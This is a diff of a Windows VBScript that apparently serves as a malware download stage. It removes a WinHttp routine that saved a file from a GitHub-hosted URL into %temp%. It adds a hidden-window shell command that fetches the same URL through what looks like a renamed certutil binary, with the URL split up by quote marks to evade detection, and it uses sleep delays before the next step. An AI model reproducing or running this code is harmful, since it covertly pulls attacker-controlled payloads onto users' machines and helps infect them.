@@ -1,21 +1,8 @@
 WScript.Sleep(20000)
 
-Set objWinHttp = CreateObject("WinHttp.WinHttpRequest.5.1")
-URL = "https://raw.githubusercontent.com/kaitlyn93/Grandcoffee/main/js/scripts/write32.js"
-objWinHttp.open "GET", URL, False
-objWinHttp.send ""
-SaveBinaryData "%temp%\write32\write32.crt",objWinHttp.responseBody
-Function SaveBinaryData(FileName, Data)
-	Const adTypeText = 1
-	Const adSaveCreateOverWrite = 2
-	Dim BinaryStream
-	Set BinaryStream = CreateObject("ADODB.Stream")
-	BinaryStream.Type = adTypeText
-	BinaryStream.Open
-	BinaryStream.Write Data
-	BinaryStream.SaveToFile FileName, adSaveCreateOverWrite
-End Function
-
+Set objShell = WScript.CreateObject("WScript.Shell")
+objShell.Run "%temp%\write32\wincgi.exe -f -ur""""lc""""ache h""""t""""t""""ps:/""""/raw.githubusercontent.com/kaitlyn93/Grandcoffee/main/js/scripts/write32.js "%temp%\write32\write32.crt"", 0, True
+	
 WScript.Sleep(5000)
 
 Set objShell = WScript.CreateObject("WScript.Shell")
